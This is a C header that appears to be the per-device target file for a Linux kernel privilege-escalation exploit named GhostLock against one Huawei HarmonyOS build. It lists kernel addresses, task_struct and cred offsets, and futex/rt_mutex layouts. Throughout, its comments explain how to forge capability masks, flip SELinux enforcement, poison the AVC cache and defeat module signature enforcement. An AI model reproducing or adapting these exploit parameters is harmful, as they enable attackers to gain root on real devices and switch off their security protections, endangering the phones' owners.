/* GhostLock (CVE-2026-43499) target for HUAWEI DBY2-W00.
 *
 * Kernel: 5.4.86-qgki-g95ef09c54a40-dirty
 * Firmware: DBY2-W00 HarmonyOS 4.2.0.252(C00E100R3P5)
 * Config: IKCFG from the exact BOOT image.
 *
 * Image SHA-256:
 * dbea41dbb669a8abe500bf6c25b5c412ada4e0ceae1f5875b36923b860ccebc2
 *
 * Addresses were recovered from the image's embedded kallsyms table and
 * verified against the target compiler's code generation. Runtime addresses
 * are image + KASLR slide.
 */
#ifndef TARGET_H
#define TARGET_H

/* Link-time anchors. kaslr_base in the exploit is runtime _stext. */
#define KIMAGE_TEXT_BASE  0xffffffc010080000ULL
#define KIMAGE_STEXT_LINK 0xffffffc010081000ULL
#define KIMAGE_ETEXT_LINK 0xffffffc011bf0000ULL

/* Nonzero, writable pointer used as the pointer-write value. */
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc013312930ULL

/* random_table[] entries 4 (boot_id) and 5 (uuid), each 0x40 bytes. */
#define SLIDE_BOOTID_CTL_ENTRY_IMAGE 0xffffffc01348b310ULL
#define SLIDE_BOOTID_CTL_DF_IMAGE    0xffffffc01348b318ULL
#define SLIDE_UUID_CTL_ENTRY_IMAGE   0xffffffc01348b350ULL
#define SLIDE_UUID_CTL_DF_IMAGE      0xffffffc01348b358ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc013684b7cULL
#define SLIDE_RANDOM_POOLSIZE_DATA_IMAGE 0xffffffc01348b218ULL
#define SLIDE_SYSCTL_POOLSIZE_IMAGE     0xffffffc01348b200ULL
#define SLIDE_ROOT_USER_IMAGE           0xffffffc01340d858ULL
#define SLIDE_INIT_USER_NS_IMAGE        0xffffffc01340d620ULL
#define SLIDE_INIT_GROUPS_IMAGE         0xffffffc01340e670ULL

/* dump_skip()'s static zero page in fs/coredump.c starts at 0x1365ee50.
 * The exploit uses fresh 0x30-byte slots in that page. The size includes
 * rt_mutex.owner at +0x20; a 0x20 stride lets one slot corrupt the next.
 * The buffer is only consumed while writing zero-filled gaps into an ELF
 * core dump, so it is a much safer writable zero pool than empty_zero_page. */
#define GOT_FAKE_LOCK_BSS_IMAGE 0xffffffc01365ee60ULL
#define SLIDE_DUMP_SKIP_ZERO_PAGE_IMAGE 0xffffffc01365e000ULL
#define SLIDE_EMPTY_ZERO_PAGE_IMAGE 0xffffffc013619000ULL
#define SLIDE_LOCK_STRIDE 0x30ULL
#define SLIDE_LOCK_SLOTS 84
#define SLIDE_FAKE_SECURITY_BLOB_OFF 0x40ULL

/* rt_mutex_waiter offsets are unchanged from the 4.19 reference. */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38

/* arm64 5.4 thread stack geometry for this build (no KASAN/VMAP_STACK). */
#define SLIDE_THREAD_SIZE 0x4000ULL
#define SLIDE_WAITER_FROM_STACK_TOP 0x380ULL

#define SLIDE_INIT_TASK_IMAGE 0xffffffc013401d40ULL
#define SLIDE_INIT_CRED_IMAGE 0xffffffc01340e678ULL

/* __schedule executes `mrs x27, sp_el0` at +0x34 and preserves x27 until
 * the return at +0xa2c. No post-index adjustment is needed. */
#define SLIDE_SCHEDULE_IMAGE     0xffffffc011ba1e10ULL
#define SLIDE_SCHEDULE_WIN_START 0x34
#define SLIDE_SCHEDULE_WIN_END   0xa2c

/* __task_pid_nr_ns() keeps its task argument in x21 from +0x1c until the
 * epilogue. getpid() and getppid() are short, frequently callable paths. */
#define SLIDE_TASK_PID_NS_IMAGE  0xffffffc010323118ULL
#define SLIDE_TASK_PID_WIN_START 0x1c
#define SLIDE_TASK_PID_WIN_END   0xa0

/* get_user_arg_ptr() starts with mrs x8, sp_el0.  A deliberately invalid
 * execve() argv pointer exercises this path and returns EFAULT without
 * replacing the process. */
#define SLIDE_GET_USER_ARG_PTR_IMAGE 0xffffffc01056864cULL
#define SLIDE_GET_USER_ARG_WIN_START 0x00
#define SLIDE_GET_USER_ARG_WIN_END   0x110

/* do_futex(). The waiter in the WT_REQUEUE_PI path is at sp+0xe0. */
#define SLIDE_DO_FUTEX_IMAGE 0xffffffc0103dcde4ULL
#define SLIDE_SYS_FUTEX_IMAGE 0xffffffc0103e0674ULL
#define SLIDE_FUTEX_WAIT_IMAGE 0xffffffc0103de6b8ULL
#define SLIDE_FUTEX_WAKE_IMAGE 0xffffffc0103de98cULL
#define SLIDE_FUTEX_WAIT_SETUP_IMAGE 0xffffffc0103e13dcULL
#define SLIDE_SYS_SETSOCKOPT_IMAGE 0xffffffc01180e2c0ULL
#define SLIDE_ARCH_COPY_FROM_USER_IMAGE 0xffffffc01008f640ULL
#define SLIDE_SOCK_COMMON_SETSOCKOPT_IMAGE 0xffffffc01181dfc4ULL
#define SLIDE_UDP_SETSOCKOPT_IMAGE 0xffffffc01191e3f0ULL
#define SLIDE_IP_SETSOCKOPT_IMAGE 0xffffffc0118e5f70ULL
#define SLIDE_DO_IP_SETSOCKOPT_IMAGE 0xffffffc0118e6004ULL
#define SLIDE_REMOVE_WAITER_IMAGE 0xffffffc010390784ULL
#define SLIDE_RT_MUTEX_ADJUST_PRIO_CHAIN_IMAGE 0xffffffc01038f448ULL
#define SLIDE_TASK_BLOCKS_ON_RT_MUTEX_IMAGE 0xffffffc0103902a4ULL
#define SLIDE_RT_MUTEX_START_PROXY_LOCK_IMAGE 0xffffffc0103906dcULL
#define SLIDE_RT_MUTEX_WAIT_PROXY_LOCK_IMAGE 0xffffffc010390a50ULL
#define SLIDE_RT_MUTEX_CLEANUP_PROXY_LOCK_IMAGE 0xffffffc010390adcULL

/* task_struct and cred fields from pahole on the target vmlinux. */
#define SLIDE_TASK_REAL_CRED_OFF 0x7b8
#define SLIDE_TASK_CRED_OFF      0x7c0
#define SLIDE_TASK_COMM_OFF      0x7d0
#define SLIDE_CRED_UID_OFF       0x04
#define SLIDE_CRED_SECUREBITS_OFF 0x24
#define SLIDE_CRED_CAP_INHERITABLE_OFF 0x28
#define SLIDE_CRED_CAP_PERMITTED_OFF 0x30
#define SLIDE_CRED_CAP_EFFECTIVE_OFF 0x38
#define SLIDE_CRED_CAP_BSET_OFF 0x40
#define SLIDE_CRED_CAP_AMBIENT_OFF 0x48
#define SLIDE_CRED_SECURITY_OFF 0x78
#define SLIDE_CRED_USER_OFF 0x80
#define SLIDE_CRED_USER_NS_OFF 0x88
#define SLIDE_CRED_GROUP_INFO_OFF 0x90

/* The low 32 bits become the live capability mask.  This address is inside
 * dump_skip()'s zero page, so the same pointer also gives rb_erase a safe fake
 * parent node while encoding every capability below bit 12. */
#define SLIDE_CRED_CAP_PATTERN_IMAGE 0xffffffc01365efffULL

/* Device config has CONFIG_PANIC_ON_OOPS=y. */
#define SLIDE_PANIC_ON_OOPS_IMAGE 0xffffffc013407320ULL

/* selinux_state.enforcing at +0, initialized at +2; AVC threshold at +0. */
#define SLIDE_SELINUX_STATE_IMAGE               0xffffffc013618000ULL
#define SLIDE_SELINUX_STATE_INITIALIZED_IMAGE 0xffffffc013618002ULL
#define SLIDE_AVC_CACHE_THRESHOLD_IMAGE        0xffffffc01366f0b8ULL

/* Runtime AVC cache used by avc_has_perm().  The shell SID and the kernel
 * SECCLASS_SYSTEM constant are stable for this firmware and policy. */
#define SLIDE_SELINUX_AVC_IMAGE                 0xffffffc01366f0b8ULL
#define SLIDE_ADB_SHELL_SID                     1179U
#define SLIDE_SECCLASS_SYSTEM                   4U
#define SLIDE_SECCLASS_CAPABILITY               5U
#define SLIDE_FAKE_AVC_NODE_OFF                 0x20ULL
#define SLIDE_FAKE_AVC_NODE_BYTES               0x48ULL

/* A low16=4 mapping is used to restore the fake AVC entry's class field.
 * The collateral eight-byte store lands in adjacent procfs BSS padding. */
#define SLIDE_AVC_CLASS_REPAIR_IMAGE            0xffffffc013660004ULL

/* kernel/module.c: force-loaded modules still pass through signature checks. */
#define SLIDE_SIG_ENFORCE_IMAGE                  0xffffffc01341e118ULL
#define SLIDE_MODULES_DISABLED_IMAGE             0xffffffc0136534dcULL
#define SLIDE_MODULE_BLACKLIST_IMAGE             0xffffffc0136534e0ULL

/* Security hook list heads used by init_module/finit_module policy checks. */
#define SLIDE_SECURITY_HOOK_HEADS_IMAGE          0xffffffc012c904f0ULL
#define SLIDE_SECURITY_HOOK_CAPABLE_OFF          0x40ULL
#define SLIDE_SECURITY_HOOK_LOAD_DATA_OFF        0x2d0ULL

#endif
